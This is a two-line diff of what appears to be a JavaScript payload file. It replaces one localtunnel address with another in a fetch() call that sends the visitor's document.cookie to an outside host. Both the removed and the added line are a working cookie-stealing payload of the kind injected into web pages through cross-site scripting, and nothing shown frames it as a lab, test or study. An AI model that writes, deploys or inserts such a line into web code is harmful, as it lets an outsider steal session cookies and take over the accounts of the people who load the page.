@@ -1,2 +1,2 @@
-fetch('https://hot-roses-pump.loca.lt?c=' + document.cookie);
+fetch('https://fresh-badgers-draw.loca.lt?c=' + document.cookie);
 
